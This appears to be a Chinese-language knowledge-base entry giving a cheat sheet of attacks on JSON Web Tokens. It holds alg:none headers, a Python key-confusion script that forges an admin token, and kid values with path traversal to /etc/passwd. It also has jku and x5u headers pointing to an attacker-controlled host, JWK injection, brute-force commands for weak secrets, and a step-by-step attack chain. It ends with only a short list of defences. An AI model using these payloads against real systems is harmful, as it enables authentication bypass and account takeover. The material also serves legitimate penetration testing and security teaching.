knowledge: "# JWT详细分类\n\n## 1. JWT基础\n\n### JWT结构\n\n```\nHeader.Payload.Signature\n```\n\n### 解码\n\n```bash\n# jwt.io\necho\
  \ \"TOKEN\" | cut -d'.' -f1 | base64 -d\n```\n\n---\n\n## 2. None算法攻击 (alg:none)\n\n```json\n{\"alg\":\"none\",\"typ\":\"\
  JWT\",\"payload\":\"...\"}\n{\"alg\":\"None\",\"typ\":\"JWT\",\"payload\":\"...\"}\n{\"alg\":\"NONE\",\"typ\":\"JWT\",\"\
  payload\":\"...\"}\n```\n\n---\n\n## 3. 密钥混淆攻击 (RS256 -> HS256)\n\n### 步骤\n\n1. 获取公钥\n2. 将公钥作为HMAC密钥签名\n3. 将alg改为HS256\n\
  \n### Python示例\n\n```python\nimport jwt\n\npublic_key = open(\"public.pem\").read()\npayload = {\"user\": \"admin\", \"\
  role\": \"admin\"}\n\n# 使用公钥作为HMAC密钥\ntoken = jwt.encode(payload, public_key, algorithm=\"HS256\")\nprint(token)\n```\n\n\
  ---\n\n## 4. KID注入\n\n```json\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../dev/null\"}\n{\"alg\":\"HS256\"\
  ,\"typ\":\"JWT\",\"kid\":\"key-1\"}\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../etc/passwd\"}\n```\n\n---\n\n\
  ## 5. jku注入\n\n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jku\": \"http://attacker.com/jwk.json\"\n}\n\
  ```\n\n### 恶意JWK\n\n```json\n{\n  \"kty\": \"oct\",\n  \"k\": \"YXJj\",\n  \"alg\": \"HS256\"\n}\n```\n\n---\n\n## 6. x5u注入\n\
  \n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"x5u\": \"http://attacker.com/cert.pem\"\n}\n```\n\n---\n\n\
  ## 7. 弱密钥爆破\n\n### 使用hashcat\n\n```bash\nhashcat -m 16500 jwt.txt wordlist.txt\n```\n\n### 使用jwt_tool\n\n```bash\npython3\
  \ jwt_tool.py TOKEN -C -d wordlist.txt\n```\n\n### 使用John\n\n```bash\njwt2john.py jwt.txt > hash.txt\njohn --wordlist=wordlist.txt\
  \ hash.txt\n```\n\n---\n\n## 8. JWK密钥注入\n\n```json\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"\
  kty\": \"RSA\",\n    \"n\": \"...\",\n    \"e\": \"AQAB\",\n    \"alg\": \"RS256\"\n  }\n}\n```\n\n---\n\n## 9. 常用工具\n\n\
  ```bash\n# jwt_tool\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\npython3 jwt_tool.py TOKEN -X -k public.pem\npython3 jwt_tool.py\
  \ TOKEN --at\n\n# jwt.io\n# 在线解码和构造\n\n# c-jwt-cracker\n./c-jwt-cracker -t TOKEN -w wordlist.txt\n```\n\n---\n\n## 10. 攻击示例\n\
  \n### 完整攻击链\n\n```bash\n# 1. 解码JWT\necho \"TOKEN\" | cut -d'.' -f1 | base64 -d\n\n# 2. 尝试none算法\npython3 jwt_tool.py TOKEN\
  \ -X a\n\n# 3. 密钥混淆\npython3 jwt_tool.py TOKEN -X s -pr public.pem\n\n# 4. 爆破弱密钥\npython3 jwt_tool.py TOKEN -C -d wordlist.txt\n\
  ```\n\n---\n\n## 11. 防御措施\n\n- 使用强密钥\n- 验证算法\n- 检查密钥来源\n- 使用JWKS\n- 设置过期时间\n"
